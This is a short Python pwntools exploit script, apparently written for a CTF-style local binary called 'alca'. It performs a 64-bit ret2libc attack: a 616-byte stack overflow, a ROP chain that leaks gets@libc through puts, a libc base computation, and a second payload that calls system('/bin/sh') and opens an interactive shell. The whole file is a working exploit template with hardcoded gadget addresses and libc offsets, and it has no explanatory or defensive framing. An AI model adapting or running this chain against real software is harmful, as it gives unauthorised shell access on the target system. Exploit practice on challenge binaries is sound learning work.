#!/usr/bin/python

# arch: 64 bit
# protections: NX, ASLR
# vuln type: stack-based overflow - leaking gets@libc with puts(), then calling system with /bin/sh as argument.

# offset: 616

from pwn import *

r = process('./alca')

def get_leak():
    
    global pop_rdi
    pop_rdi = (0x000000000040123b)
    arg_gets = (0x404020)
    puts_plt = (0x401040)
    ret_vuln = (0x401199)

    payload = b"A"*616
    payload += p64(pop_rdi)
    payload += p64(arg_gets)
    payload += p64(puts_plt)
    payload += p64(ret_vuln)

    r.sendline(payload)
    r.recvline()

    alca = r.recvline()
    leak = u64(alca.strip("\n").ljust(8, "\x00"))
    log.info("gets@libc at: {}".format(hex(leak)))
    
    return leak

#------------------------------------------------#

def main():
    libc_base = (get_leak() - 0x75380)

    arg_sh = (libc_base + 0x198882)
    system = (libc_base + 0x49860)
    ret_exit = (libc_base + 0x3f100)

    log.info("libc_base address: {}".format(hex(libc_base)))
    log.info("/bin/sh at: {}".format(hex(arg_sh)))
    log.info("system@libc at: {}".format(hex(system)))
    log.info("exit@libc at: {}".format(hex(ret_exit)))

    sendme = b"A"*616
    sendme += p64(pop_rdi)
    sendme += p64(arg_sh)
    sendme += p64(system)
    sendme += p64(ret_exit)

    r.sendline(sendme)
    r.interactive()

if __name__ == "__main__":
    main()
